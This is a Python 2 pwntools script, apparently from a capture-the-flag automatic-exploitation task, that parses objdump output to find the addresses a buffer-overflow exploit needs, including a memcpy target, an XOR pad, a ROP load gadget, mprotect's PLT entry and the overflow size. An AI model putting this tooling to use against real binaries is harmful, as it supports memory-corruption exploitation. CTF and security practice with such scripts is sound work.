import re
from pwn import *

# Mistakes were made

context.log_level = 'error'

def get_addresses(path):
    # Objdump all the segments
    res = {}
    o = ''
    p = process(['objdump', '-S', '-M', 'intel', path])
    while 1:
        try:
            o += p.recv(1024)
        except EOFError:
            break

    # Seg
    hex_rex = '([\dabcdef]*)'
    put_rex = '<puts@plt>\n'
    rex = put_rex + '.{0,1024}?' + put_rex
    seg = re.search(rex, o, flags = re.DOTALL).group(0)

    # Find start
    start = re.search(hex_rex + ':', seg).group(1)
    res['start'] = int(start, 16)

    # Find buf
    buf = re.findall('movzx  eax,.*?# ' + hex_rex, seg)
    res['buf'] = min(map(lambda x: int(x, 16), buf))

    # Find avoid
    avoid = re.search(hex_rex + ':', seg.split('\n')[-3]).group(1)
    res['avoid'] = int(avoid, 16)

    # Find target
    target = re.search('\n(.*)?<memcpy@plt>:', o).group(1)
    res['target'] = int(target, 16)

    # Find xor pad
    s = re.search('xor.{0,1024}?.xor.*?\n', o, flags = re.DOTALL).group(0)
    s = re.findall('xor.*?,.*?\n', s)
    s = map(lambda x: x.split(',')[-1], s)
    s = map(lambda x: int(x, 16) % 0xff, s)
    res['pad'] = map(chr, s)

    # Find load gadget
    s = re.search(hex_rex + ':.*?mov.*?rdi,QWORD PTR \[rbp-0x' + hex_rex, o)
    res['load_gadget'] = int(s.group(1).strip(), 16)
    res['load_offset'] = int(s.group(2).strip(), 16)
    print 'Load gadget = 0x%x' % res['load_gadget']
    print 'Load offset = 0x%x' % res['load_offset']

    # Find mprotect
    s = re.search(hex_rex + ' <mprotect@plt>', o).group(1).strip()
    res['plt_mprotect'] = int(s, 16)
    print 'Mprotect = 0x%x' % res['plt_mprotect']

    # Find buffer location
    s = re.search('ecx,0x' + hex_rex + '.{0,512}rax,\[rbp-0x' + hex_rex + '\].{0,512}<memcpy@plt>', o, flags = re.DOTALL)
    res['buf_loc'] = int(s.group(1), 16)
    res['overflow_size'] = int(s.group(2), 16)
    print 'Buffer location = 0x%x' % res['buf_loc']
    print 'Buffer overflow size = 0x%x' % res['overflow_size']

    print 'Buf = 0x%x' % res['buf']
    print 'Start = 0x%x' % res['start']
    print 'Avoid = 0x%x' % res['avoid']
    print 'Target = 0x%x' % res['target']

    return res
